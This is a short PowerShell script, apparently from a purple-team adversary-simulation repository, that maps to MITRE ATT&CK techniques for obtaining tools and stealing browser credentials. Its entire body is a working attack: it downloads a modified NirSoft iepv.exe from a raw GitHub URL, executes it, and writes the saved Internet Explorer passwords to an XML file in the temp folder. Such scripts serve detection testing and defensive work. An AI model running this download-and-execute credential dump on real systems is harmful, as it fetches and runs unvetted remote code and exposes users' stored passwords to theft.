<#
    T1588.002 - Obtain Capabilities: Tool
    T1555.003 - Credentials from Password Stores: Credentials from Web Browsers
    Extract passwords from Internet Explorer browser with Nirsoft tool iepv.exe
    Download  iepv.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/iepv.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

# Download and execute iepv.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/iepv.exe"
$dumpfile = "$env:tmp\iepasswords.xml"
$outfile = "$env:tmp\iepass.exe"

try {
    Invoke-WebRequest $url -OutFile $outfile  -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: iepv.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download iepv.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Internet Explorer passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Internet Explorer passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
